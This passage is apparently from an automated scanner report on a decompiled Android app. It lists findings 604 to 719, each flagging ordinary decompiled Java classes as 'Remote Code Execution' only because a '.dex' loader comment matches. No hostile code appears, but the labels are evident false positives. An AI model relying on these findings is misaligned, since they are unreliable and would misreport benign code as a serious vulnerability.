- **File:** `sources/r/b.java`
- **Line:** 6

```java
import java.util.Objects;
import r.c;

/* loaded from: classes15.dex */
public final class b implements Runnable {

    /* renamed from: b, reason: collision with root package name */
```

**604. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/a0.java`
- **Line:** 9

```java
import r.h;
import v.o;

/* loaded from: classes14.dex */
public final class a0 implements d.a<Object> {

    /* renamed from: b, reason: collision with root package name */
```

**605. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/w.java`
- **Line:** 5

```java

import androidx.annotation.NonNull;

/* loaded from: classes10.dex */
public interface w<Z> {
    @NonNull
    Class<Z> b();
```

**606. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/n.java`
- **Line:** 18

```java
import r.j;
import r.q;

/* loaded from: classes5.dex */
public final class n<R> implements j.a<R>, a.d {
    public static final c A = new c();

```

**607. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/n.java`
- **Line:** 97

```java
    /* renamed from: z, reason: collision with root package name */
    public boolean f4944z;

    /* loaded from: classes13.dex */
    public class a implements Runnable {

        /* renamed from: b, reason: collision with root package name */
```

**608. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/n.java`
- **Line:** 129

```java
        }
    }

    /* loaded from: classes12.dex */
    public class b implements Runnable {

        /* renamed from: b, reason: collision with root package name */
```

**609. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/n.java`
- **Line:** 164

```java
    }

    @VisibleForTesting
    /* loaded from: classes7.dex */
    public static class c {
    }

```

**610. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/n.java`
- **Line:** 168

```java
    public static class c {
    }

    /* loaded from: classes7.dex */
    public static final class d {

        /* renamed from: a, reason: collision with root package name */
```

**611. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/z.java`
- **Line:** 7

```java
import android.os.Looper;
import android.os.Message;

/* loaded from: classes19.dex */
public final class z {

    /* renamed from: a, reason: collision with root package name */
```

**612. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/z.java`
- **Line:** 16

```java
    /* renamed from: b, reason: collision with root package name */
    public final Handler f5006b = new Handler(Looper.getMainLooper(), new a());

    /* loaded from: classes22.dex */
    public static final class a implements Handler.Callback {
        @Override // android.os.Handler.Callback
        public final boolean handleMessage(Message message) {
```

**613. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/o.java`
- **Line:** 3

```java
package r;

/* loaded from: classes20.dex */
public interface o {
}

```

**614. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/v.java`
- **Line:** 9

```java
import m0.a;
import m0.d;

/* loaded from: classes3.dex */
public final class v<Z> implements w<Z>, a.d {

    /* renamed from: f, reason: collision with root package name */
```

**615. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/v.java`
- **Line:** 27

```java
    /* renamed from: e, reason: collision with root package name */
    public boolean f4985e;

    /* loaded from: classes20.dex */
    public class a implements a.b<v<?>> {
        @Override // m0.a.b
        public final v<?> a() {
```

**616. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/c.java`
- **Line:** 15

```java
import java.util.concurrent.Executors;
import r.q;

/* loaded from: classes4.dex */
public final class c {

    /* renamed from: a, reason: collision with root package name */
```

**617. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/c.java`
- **Line:** 32

```java
    public q.a f4817d;

    @VisibleForTesting
    /* loaded from: classes2.dex */
    public static final class a extends WeakReference<q<?>> {

        /* renamed from: a, reason: collision with root package name */
```

**618. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/h.java`
- **Line:** 5

```java

import androidx.annotation.Nullable;

/* loaded from: classes17.dex */
public interface h {

    /* loaded from: classes15.dex */
```

**619. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/h.java`
- **Line:** 8

```java
/* loaded from: classes17.dex */
public interface h {

    /* loaded from: classes15.dex */
    public interface a {
        void a();

```

**620. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/b0.java`
- **Line:** 11

```java
import r.h;
import v.o;

/* loaded from: classes12.dex */
public final class b0 implements h, h.a {

    /* renamed from: b, reason: collision with root package name */
```

**621. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/d.java`
- **Line:** 3

```java
package r;

/* loaded from: classes11.dex */
public final class d extends RuntimeException {
    public d(Throwable th) {
        super("Unexpected exception thrown by non-Glide code", th);
```

**622. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/q.java`
- **Line:** 6

```java
import androidx.annotation.NonNull;
import java.util.Objects;

/* loaded from: classes17.dex */
public final class q<Z> implements w<Z> {

    /* renamed from: b, reason: collision with root package name */
```

**623. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/q.java`
- **Line:** 30

```java
    /* renamed from: h, reason: collision with root package name */
    public boolean f4967h;

    /* loaded from: classes3.dex */
    public interface a {
        void a(p.f fVar, q<?> qVar);
    }
```

**624. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/p.java`
- **Line:** 8

```java
import java.util.Map;
import java.util.Objects;

/* loaded from: classes13.dex */
public final class p implements p.f {

    /* renamed from: b, reason: collision with root package name */
```

**625. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/e.java`
- **Line:** 10

```java
import r.h;
import v.o;

/* loaded from: classes15.dex */
public final class e implements h, d.a<Object> {

    /* renamed from: b, reason: collision with root package name */
```

**626. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/i.java`
- **Line:** 14

```java
import r.m;
import v.o;

/* loaded from: classes24.dex */
public final class i<Transcode> {

    /* renamed from: a, reason: collision with root package name */
```

**627. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/j.java`
- **Line:** 22

```java
import r.n;
import r.q;

/* loaded from: classes7.dex */
public final class j<R> implements h.a, Runnable, Comparable<j<?>>, a.d {
    public Object A;
    public p.a B;
```

**628. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/j.java`
- **Line:** 107

```java
    /* renamed from: h, reason: collision with root package name */
    public final e f4859h = new e();

    /* loaded from: classes12.dex */
    public interface a<R> {
    }

```

**629. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/j.java`
- **Line:** 121

```java
        }
    }

    /* loaded from: classes17.dex */
    public static class c<Z> {

        /* renamed from: a, reason: collision with root package name */
```

**630. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/j.java`
- **Line:** 134

```java
        public v<Z> f4882c;
    }

    /* loaded from: classes15.dex */
    public interface d {
    }

```

**631. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/j.java`
- **Line:** 138

```java
    public interface d {
    }

    /* loaded from: classes20.dex */
    public static class e {

        /* renamed from: a, reason: collision with root package name */
```

**632. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/s.java`
- **Line:** 3

```java
package r;

/* loaded from: classes23.dex */
public interface s {
    void a();
}
```

**633. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/f.java`
- **Line:** 6

```java
import androidx.annotation.NonNull;
import java.security.MessageDigest;

/* loaded from: classes21.dex */
public final class f implements p.f {

    /* renamed from: b, reason: collision with root package name */
```

**634. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/g.java`
- **Line:** 5

```java

import t.a;

/* loaded from: classes20.dex */
public final class g<DataType> implements a.b {

    /* renamed from: a, reason: collision with root package name */
```

**635. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/r.java`
- **Line:** 13

```java
import java.util.Iterator;
import java.util.List;

/* loaded from: classes3.dex */
public final class r extends Exception {

    /* renamed from: g, reason: collision with root package name */
```

**636. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/r.java`
- **Line:** 34

```java
    /* renamed from: f, reason: collision with root package name */
    public String f4973f;

    /* loaded from: classes22.dex */
    public static final class a implements Appendable {

        /* renamed from: b, reason: collision with root package name */
```

**637. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/k.java`
- **Line:** 14

```java
import r.j;
import v.o;

/* loaded from: classes7.dex */
public final class k<DataType, ResourceType, Transcode> {

    /* renamed from: a, reason: collision with root package name */
```

**638. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/k.java`
- **Line:** 32

```java
    /* renamed from: e, reason: collision with root package name */
    public final String f4890e;

    /* loaded from: classes11.dex */
    public interface a<ResourceType> {
    }

```

**639. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/u.java`
- **Line:** 11

```java
import java.util.Objects;
import r.k;

/* loaded from: classes11.dex */
public final class u<Data, ResourceType, Transcode> {

    /* renamed from: a, reason: collision with root package name */
```

**640. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/y.java`
- **Line:** 7

```java
import java.nio.ByteBuffer;
import java.security.MessageDigest;

/* loaded from: classes8.dex */
public final class y implements p.f {

    /* renamed from: j, reason: collision with root package name */
```

**641. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/l.java`
- **Line:** 3

```java
package r;

/* loaded from: classes22.dex */
public abstract class l {

    /* renamed from: a, reason: collision with root package name */
```

**642. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/l.java`
- **Line:** 18

```java
    /* renamed from: d, reason: collision with root package name */
    public static final d f4894d = new d();

    /* loaded from: classes6.dex */
    public class a extends l {
        @Override // r.l
        public final boolean a() {
```

**643. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/l.java`
- **Line:** 41

```java
        }
    }

    /* loaded from: classes19.dex */
    public class b extends l {
        @Override // r.l
        public final boolean a() {
```

**644. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/l.java`
- **Line:** 64

```java
        }
    }

    /* loaded from: classes10.dex */
    public class c extends l {
        @Override // r.l
        public final boolean a() {
```

**645. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/l.java`
- **Line:** 87

```java
        }
    }

    /* loaded from: classes12.dex */
    public class d extends l {
        @Override // r.l
        public final boolean a() {
```

**646. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/m.java`
- **Line:** 21

```java
import t.a;
import t.i;

/* loaded from: classes9.dex */
public final class m implements o, i.a, q.a {

    /* renamed from: h, reason: collision with root package name */
```

**647. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/m.java`
- **Line:** 49

```java
    public final r.c f4902g;

    @VisibleForTesting
    /* loaded from: classes13.dex */
    public static class a {

        /* renamed from: a, reason: collision with root package name */
```

**648. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/m.java`
- **Line:** 62

```java
        public int f4905c;

        /* renamed from: r.m$a$a, reason: collision with other inner class name */
        /* loaded from: classes11.dex */
        public class C0062a implements a.b<j<?>> {
            public C0062a() {
            }
```

**649. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/m.java`
- **Line:** 80

```java
    }

    @VisibleForTesting
    /* loaded from: classes20.dex */
    public static class b {

        /* renamed from: a, reason: collision with root package name */
```

**650. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/m.java`
- **Line:** 104

```java
        /* renamed from: g, reason: collision with root package name */
        public final Pools.Pool<n<?>> f4913g = (a.c) m0.a.a(TbsListener.ErrorCode.STARTDOWNLOAD_API_LEVEL_BELOW_FROYO, new a());

        /* loaded from: classes7.dex */
        public class a implements a.b<n<?>> {
            public a() {
            }
```

**651. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/x.java`
- **Line:** 13

```java
import r.h;
import v.o;

/* loaded from: classes10.dex */
public final class x implements h, d.a<Object> {

    /* renamed from: b, reason: collision with root package name */
```

**652. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/a.java`
- **Line:** 7

```java
import androidx.annotation.NonNull;
import java.util.concurrent.ThreadFactory;

/* loaded from: classes19.dex */
public final class a implements ThreadFactory {

    /* renamed from: r.a$a, reason: collision with other inner class name */
```

**653. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/a.java`
- **Line:** 11

```java
public final class a implements ThreadFactory {

    /* renamed from: r.a$a, reason: collision with other inner class name */
    /* loaded from: classes25.dex */
    public class RunnableC0061a implements Runnable {

        /* renamed from: b, reason: collision with root package name */
```

**654. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r/t.java`
- **Line:** 18

```java
import java.util.Iterator;
import java.util.Map;

/* loaded from: classes6.dex */
public final class t implements z0.j {

    /* renamed from: e, reason: collision with root package name */
```

**655. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/b.java`
- **Line:** 36

```java
import javax.annotation.concurrent.GuardedBy;
import s0.d;

/* loaded from: classes7.dex */
public final class b implements Handler.Callback {

    /* renamed from: i, reason: collision with root package name */
```

**656. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/b.java`
- **Line:** 77

```java
    /* renamed from: h, reason: collision with root package name */
    public final b1.a f5023h;

    /* loaded from: classes6.dex */
    public class a<O> {

        /* renamed from: a, reason: collision with root package name */
```

**657. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/b.java`
- **Line:** 129

```java
    }

    /* renamed from: r0.b$b, reason: collision with other inner class name */
    /* loaded from: classes9.dex */
    public static class C0064b {

        /* renamed from: a, reason: collision with root package name */
```

**658. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/c.java`
- **Line:** 3

```java
package r0;

/* loaded from: classes23.dex */
public final class c {
}

```

**659. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/h.java`
- **Line:** 3

```java
package r0;

/* loaded from: classes7.dex */
public final class h {
}

```

**660. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/d.java`
- **Line:** 3

```java
package r0;

/* loaded from: classes21.dex */
public interface d {
}

```

**661. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/e.java`
- **Line:** 3

```java
package r0;

/* loaded from: classes21.dex */
public final class e {
}

```

**662. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/i.java`
- **Line:** 6

```java
import androidx.annotation.Nullable;
import r0.b;

/* loaded from: classes2.dex */
public abstract class i extends f {
    /* JADX WARN: Incorrect return type in method signature: (Lr0/b$a<*>;)[Lp0/b; */
    @Nullable
```

**663. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/j.java`
- **Line:** 5

```java

import java.util.Objects;

/* loaded from: classes3.dex */
public final class j<O> {
    public final boolean equals(Object obj) {
        if (obj == this) {
```

**664. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/f.java`
- **Line:** 6

```java
import androidx.annotation.NonNull;
import com.google.android.gms.common.api.Status;

/* loaded from: classes8.dex */
public abstract class f {
    public abstract void a(@NonNull Status status);

```

**665. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/g.java`
- **Line:** 5

```java

import r0.a;

/* loaded from: classes3.dex */
public final class g implements a.InterfaceC0063a {

    /* renamed from: a, reason: collision with root package name */
```

**666. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/k.java`
- **Line:** 3

```java
package r0;

/* loaded from: classes5.dex */
public final class k {
}

```

**667. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/a.java`
- **Line:** 12

```java
import java.util.concurrent.atomic.AtomicBoolean;
import javax.annotation.concurrent.GuardedBy;

/* loaded from: classes19.dex */
public final class a implements Application.ActivityLifecycleCallbacks, ComponentCallbacks2 {

    /* renamed from: f, reason: collision with root package name */
```

**668. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/r0/a.java`
- **Line:** 33

```java
    public boolean f5011e = false;

    /* renamed from: r0.a$a, reason: collision with other inner class name */
    /* loaded from: classes25.dex */
    public interface InterfaceC0063a {
        void a(boolean z4);
    }
```

**669. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u/a.java`
- **Line:** 17

```java
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

/* loaded from: classes5.dex */
public final class a implements ExecutorService {

    /* renamed from: c, reason: collision with root package name */
```

**670. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u/a.java`
- **Line:** 30

```java
    public final ExecutorService f5458b;

    /* renamed from: u.a$a, reason: collision with other inner class name */
    /* loaded from: classes18.dex */
    public static final class ThreadFactoryC0069a implements ThreadFactory {

        /* renamed from: b, reason: collision with root package name */
```

**671. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u/a.java`
- **Line:** 43

```java
        public int f5461d;

        /* renamed from: u.a$a$a, reason: collision with other inner class name */
        /* loaded from: classes19.dex */
        public class C0070a extends Thread {
            public C0070a(Runnable runnable, String str) {
                super(runnable, str);
```

**672. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/q1/a.java`
- **Line:** 15

```java
import androidx.annotation.RestrictTo;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes15.dex */
public final class a implements View.OnTouchListener {

    /* renamed from: b, reason: collision with root package name */
```

**673. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/b.java`
- **Line:** 3

```java
package i;

/* loaded from: classes10.dex */
public enum b {
    AutoCloseSource,
    /* JADX INFO: Fake field, exist only in values array */
```

**674. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/c.java`
- **Line:** 7

```java
import java.util.Locale;
import java.util.TimeZone;

/* loaded from: classes12.dex */
public interface c {
    boolean A(b bVar);

```

**675. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/h.java`
- **Line:** 5

```java

import java.lang.reflect.Type;

/* loaded from: classes15.dex */
public final class h {

    /* renamed from: a, reason: collision with root package name */
```

**676. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/d.java`
- **Line:** 13

```java
import kotlin.text.Typography;
import org.apache.commons.io.IOUtils;

/* loaded from: classes6.dex */
public abstract class d implements c, Closeable {

    /* renamed from: p, reason: collision with root package name */
```

**677. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/e.java`
- **Line:** 7

```java
import java.math.BigDecimal;
import java.util.Properties;

/* loaded from: classes5.dex */
public final class e extends d {

    /* renamed from: s, reason: collision with root package name */
```

**678. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/i.java`
- **Line:** 40

```java
import m.f;
import org.apache.commons.io.FilenameUtils;

/* loaded from: classes20.dex */
public final class i {

    /* renamed from: k, reason: collision with root package name */
```

**679. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/j.java`
- **Line:** 3

```java
package i;

/* loaded from: classes14.dex */
public final class j {

    /* renamed from: b, reason: collision with root package name */
```

**680. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/f.java`
- **Line:** 9

```java
import java.util.Date;
import java.util.TimeZone;

/* loaded from: classes15.dex */
public final class f extends d {

    /* renamed from: r, reason: collision with root package name */
```

**681. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/g.java`
- **Line:** 45

```java
import q3.s;
import z3.t;

/* loaded from: classes2.dex */
public final class g implements z0.j, q, t {

    /* renamed from: e, reason: collision with root package name */
```

**682. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/a.java`
- **Line:** 27

```java
import k.c1;
import k.l0;

/* loaded from: classes24.dex */
public final class a implements Closeable {

    /* renamed from: p, reason: collision with root package name */
```

**683. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/i/a.java`
- **Line:** 76

```java
    public l f3154o = null;

    /* renamed from: i.a$a, reason: collision with other inner class name */
    /* loaded from: classes13.dex */
    public static class C0035a {

        /* renamed from: a, reason: collision with root package name */
```

**684. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/b.java`
- **Line:** 11

```java
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;

/* loaded from: classes8.dex */
public final class b implements Closeable {

    /* renamed from: b, reason: collision with root package name */
```

**685. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/b.java`
- **Line:** 29

```java
    /* renamed from: f, reason: collision with root package name */
    public int f4495f;

    /* loaded from: classes12.dex */
    public class a extends ByteArrayOutputStream {
        public a(int i5) {
            super(i5);
```

**686. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/c.java`
- **Line:** 7

```java
import java.io.IOException;
import java.nio.charset.Charset;

/* loaded from: classes24.dex */
public final class c {

    /* renamed from: a, reason: collision with root package name */
```

**687. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/a.java`
- **Line:** 26

```java
import java.util.concurrent.TimeUnit;
import org.apache.commons.io.FilenameUtils;

/* loaded from: classes24.dex */
public final class a implements Closeable {

    /* renamed from: b, reason: collision with root package name */
```

**688. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/a.java`
- **Line:** 72

```java
    public final int f4469h = 1;

    /* renamed from: n.a$a, reason: collision with other inner class name */
    /* loaded from: classes6.dex */
    public class CallableC0055a implements Callable<Void> {
        public CallableC0055a() {
        }
```

**689. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/a.java`
- **Line:** 93

```java
        }
    }

    /* loaded from: classes4.dex */
    public static final class b implements ThreadFactory {
        @Override // java.util.concurrent.ThreadFactory
        public final synchronized Thread newThread(Runnable runnable) {
```

**690. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/a.java`
- **Line:** 104

```java
        }
    }

    /* loaded from: classes4.dex */
    public final class c {

        /* renamed from: a, reason: collision with root package name */
```

**691. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/n/a.java`
- **Line:** 142

```java
        }
    }

    /* loaded from: classes12.dex */
    public final class d {

        /* renamed from: a, reason: collision with root package name */
```

**692. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/b.java`
- **Line:** 5

```java

import java.util.Iterator;

/* loaded from: classes17.dex */
public final class b extends a<Object, Object> {
    public b(c3.c cVar, Class cls) {
        super(cVar, cls, null);
```

**693. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/c.java`
- **Line:** 5

```java

import java.util.Iterator;

/* loaded from: classes12.dex */
public final class c extends a<Object, Object> {
    public c(c3.c cVar, d3.b bVar) {
        super(cVar, bVar.f2487a, bVar);
```

**694. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/h.java`
- **Line:** 9

```java
import java.util.List;
import java.util.Map;

/* loaded from: classes13.dex */
public final class h {

    /* renamed from: a, reason: collision with root package name */
```

**695. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/h.java`
- **Line:** 21

```java
    /* renamed from: c, reason: collision with root package name */
    public static x2.c f5440c = x2.d.a(h.class);

    /* loaded from: classes15.dex */
    public static class a {

        /* renamed from: a, reason: collision with root package name */
```

**696. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/d.java`
- **Line:** 8

```java
import java.util.Collection;
import java.util.Iterator;

/* loaded from: classes16.dex */
public abstract class d<T, ID> implements k<T>, Serializable {

    /* renamed from: b, reason: collision with root package name */
```

**697. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/e.java`
- **Line:** 3

```java
package t2;

/* loaded from: classes19.dex */
public interface e<T> extends Iterable<T> {
    f<T> b();
}
```

**698. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/i.java`
- **Line:** 5

```java

import java.sql.SQLException;

/* loaded from: classes16.dex */
public final class i implements f<Object> {

    /* renamed from: b, reason: collision with root package name */
```

**699. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/j.java`
- **Line:** 9

```java
import java.util.Iterator;
import java.util.List;

/* loaded from: classes2.dex */
public final class j<T, ID> extends d<T, ID> implements e {

    /* renamed from: i, reason: collision with root package name */
```

**700. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/f.java`
- **Line:** 5

```java

import java.util.Iterator;

/* loaded from: classes16.dex */
public interface f<T> extends Iterator<T> {
    void close();

```

**701. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/g.java`
- **Line:** 5

```java

import java.util.List;

/* loaded from: classes21.dex */
public interface g<T, ID> extends e<T> {

    public static class a {
```

**702. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/k.java`
- **Line:** 5

```java

import java.util.Collection;

/* loaded from: classes8.dex */
public interface k<T> extends Collection<T>, e<T> {
}

```

**703. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/l.java`
- **Line:** 9

```java
import java.util.HashSet;
import java.util.Iterator;

/* loaded from: classes20.dex */
public final class l<T, ID> extends d<T, ID> {
    public l(g<T, ID> gVar, Object obj, Object obj2, v2.g gVar2, String str, boolean z4) {
        super(gVar, obj, obj2, gVar2, str, z4);
```

**704. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/m.java`
- **Line:** 3

```java
package t2;

/* loaded from: classes14.dex */
public interface m {
    void a();

```

**705. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/a.java`
- **Line:** 9

```java
import java.util.Objects;
import t2.g;

/* loaded from: classes16.dex */
public abstract class a<T, ID> implements g<T, ID> {

    /* renamed from: j, reason: collision with root package name */
```

**706. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/t2/a.java`
- **Line:** 40

```java
    public f<T> f5430i;

    /* renamed from: t2.a$a, reason: collision with other inner class name */
    /* loaded from: classes8.dex */
    public static class C0068a extends ThreadLocal<List<a<?, ?>>> {
        @Override // java.lang.ThreadLocal
        public final List<a<?, ?>> initialValue() {
```

**707. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g/b.java`
- **Line:** 11

```java

@Target({ElementType.METHOD, ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes13.dex */
public @interface b {
    String[] alternateNames() default {};

```

**708. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g/c.java`
- **Line:** 10

```java

@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes8.dex */
public @interface c {
    String buildMethod() default "build";

```

**709. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g/d.java`
- **Line:** 12

```java

@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes22.dex */
public @interface d {
    boolean alphabetic() default true;

```

**710. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/g/a.java`
- **Line:** 10

```java

@Target({ElementType.CONSTRUCTOR, ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
/* loaded from: classes8.dex */
public @interface a {
}

```

**711. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/x0/b.java`
- **Line:** 5

```java

import android.content.Context;

/* loaded from: classes5.dex */
public final class b {

    /* renamed from: b, reason: collision with root package name */
```

**712. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/x0/a.java`
- **Line:** 5

```java

import android.content.Context;

/* loaded from: classes2.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**713. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/b.java`
- **Line:** 14

```java
import s3.h;
import s3.j;

/* loaded from: classes23.dex */
public final class b {

    /* renamed from: a, reason: collision with root package name */
```

**714. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/n.java`
- **Line:** 6

```java
import java.io.IOException;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes16.dex */
public final class n extends RuntimeException {

    /* renamed from: b, reason: collision with root package name */
```

**715. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/o.java`
- **Line:** 14

```java
import s3.e0;
import s3.s;

/* loaded from: classes22.dex */
public final class o {

    /* renamed from: a, reason: collision with root package name */
```

**716. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/o.java`
- **Line:** 41

```java
    /* renamed from: h, reason: collision with root package name */
    public final s3.o f5891h;

    /* loaded from: classes12.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**717. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/c.java`
- **Line:** 16

```java
import s3.b0;
import z3.v;

/* loaded from: classes13.dex */
public final class c {

    /* renamed from: a, reason: collision with root package name */
```

**718. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/c.java`
- **Line:** 37

```java
    /* renamed from: f, reason: collision with root package name */
    public final x3.d f5806f;

    /* loaded from: classes3.dex */
    public final class a extends f4.k {

        /* renamed from: c, reason: collision with root package name */
```

**719. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/w3/c.java`
- **Line:** 122

```java
        }
    }

